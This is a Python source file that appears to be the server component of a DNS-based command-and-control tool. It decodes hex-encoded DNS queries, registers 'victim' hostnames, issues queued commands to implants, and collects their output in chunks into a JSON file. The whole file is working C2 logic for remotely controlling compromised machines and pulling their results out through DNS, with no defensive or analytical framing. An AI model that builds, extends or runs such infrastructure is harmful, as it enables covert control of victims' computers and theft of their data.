# command.py
import json
import settings

# parse command from dns request.  For consistency, each value will be counted from the right
# [..., value 3, value 2, value 1]
def parsecommand(cmddata):
    decodedcmd = bytes.fromhex(cmddata[-1]).decode('utf-8')         # decode value 1, c2 option

    options = {
        "int": optInit,
        "end": optEnd,
        "fil": optFile,
        "cnk": optChunk,
        "cmd": optCommand,
    }

    return options[decodedcmd](cmddata)

# initial connection by client, set up record in manage.json and return ID to client
def optInit(cmddata):
    decodedHostname = bytes.fromhex(cmddata[-2]).decode('utf-8')         # decode value 2, victim hostname

    print("\n!!!!!!!!!!!!!!!!\n!New Connection!\n!!!!!!!!!!!!!!!!\n")

    manage = {}

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)
        
        idTracker = manage["id"]
        found = False
        
        for record in manage["clients"]:                    # check to see if this host already has an ID
            if manage["id"] == int(record):
                manage["id"] += 1
            if decodedHostname == manage["clients"][record]["hostname"]:
                found = True
                idTracker = record

        if not found:                                       # if this host doesn't have an ID, assign one and save record to manage.json
            manage["clients"][str(idTracker)] = {"hostname": decodedHostname, "command": "", "response": ""}
            manage["id"] += 1

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)
    
    print("ID: " + str(idTracker))

    return str(idTracker)

def optCommand(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID

    manage = {}
    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        command = manage["clients"][clientID]["command"]

        if command != "":
            manage["clients"][clientID]["response"] = ""
        manage["clients"][clientID]["command"] = ""

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

    return command

def optChunk(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID
    chunk = bytes.fromhex(cmddata[-3]).decode('utf-8')  # decode value 3, response chunk

    manage = {}
    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        manage["clients"][clientID]["response"] += chunk

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

    return "ready"

    

def optEnd(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID
    with open('./manage.json') as f:
        manage = json.load(f)

    print("\n" + manage["clients"][clientID]["response"])
    print("\nInput: ", end = '')

    return "ok"

def optFile(cmddata):
    return None
